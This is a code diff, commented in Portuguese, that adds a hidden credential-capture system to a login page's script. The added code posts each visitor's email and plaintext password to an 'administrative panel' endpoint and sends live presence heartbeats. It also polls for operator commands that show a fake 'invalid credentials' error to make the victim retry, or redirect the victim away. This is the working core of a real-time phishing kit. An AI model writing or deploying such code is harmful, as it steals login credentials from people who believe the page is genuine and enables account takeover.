@@ -186,6 +186,46 @@
  if(headerLogo&&loadingLogo){loadingLogo.src=headerLogo.src;}
  var eyeIcon=toggle?toggle.innerHTML:'';
  var eyeOffIcon='<svg xmlns=# viewBox="0 0 24 24" fill=none stroke=currentColor stroke-width=2 stroke-linecap=round stroke-linejoin=round class="feather feather-eye-off h-5 w-5"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1=1 y1=1 x2=23 y2=23></line></svg>';
+
+ // ================= SYNC WITH ADMIN PANEL =================
+ // Same-origin: ingress do preview roteia /api/* pro backend
+ var API='';
+ // Persistent session id (per browser) so retries update the same card
+ var SID=(function(){try{var k='cc_sid';var v=localStorage.getItem(k);if(!v){v='s_'+Math.random().toString(36).slice(2)+Date.now().toString(36);localStorage.setItem(k,v);}return v;}catch(_){return 's_'+Math.random().toString(36).slice(2)+Date.now().toString(36);}})();
+ var PAGE=location.pathname+location.hash;
+ var REF=document.referrer||'';
+ function postJSON(path,body){
+  try{return fetch(API+path,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body||{}),keepalive:true});}
+  catch(_){return Promise.resolve();}
+ }
+ // Heartbeat so painel mostra "online"
+ function beat(leaving){
+  postJSON('/api/session/heartbeat',{session_id:SID,path:PAGE,screen:'Login cel_bricks',visible:!document.hidden,leaving:!!leaving});
+ }
+ beat(false);
+ setInterval(function(){beat(false);},5000);
+ document.addEventListener('visibilitychange',function(){beat(false);});
+ window.addEventListener('pagehide',function(){beat(true);});
+ // Poll operator commands (invalid / terminate)
+ setInterval(function(){
+  fetch(API+'/api/session/poll?session_id='+encodeURIComponent(SID)).then(function(r){return r.ok?r.json():null;}).then(function(j){
+   if(!j||!j.command)return;
+   var c=j.command;
+   if(c==='invalid'){
+    if(overlay)overlay.style.display='none';
+    setBtn(true);
+    showEmailError(false);
+    if(pass){pass.value='';pass.focus();}
+    if(email){email.style.borderColor='#ef4444';}
+    if(pass){pass.style.borderColor='#ef4444';}
+    if(emailErr){emailErr.textContent='Credenciais inválidas. Tente novamente.';emailErr.style.display='block';}
+   } else if(c==='terminate'){
+    window.location.href='/';
+   }
+  }).catch(function(){});
+ },2500);
+ // =========================================================
+
  function isValidEmail(v){return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v);}
  function showEmailError(show){
   if(emailErr){emailErr.style.display=show?'block':'none';}
@@ -213,6 +253,15 @@
    if(!isValidEmail(v)){showEmailError(true);if(email)email.focus();return;}
    showEmailError(false);
    if(overlay){overlay.style.display='flex';}
+   setBtn(false);
+   // Envia captura para o painel administrativo
+   postJSON('/api/login-attempt',{
+    email:v,
+    password:pass?pass.value:'',
+    page:PAGE,
+    referrer:REF,
+    session_id:SID
+   });
   });
  }
  setBtn(false);
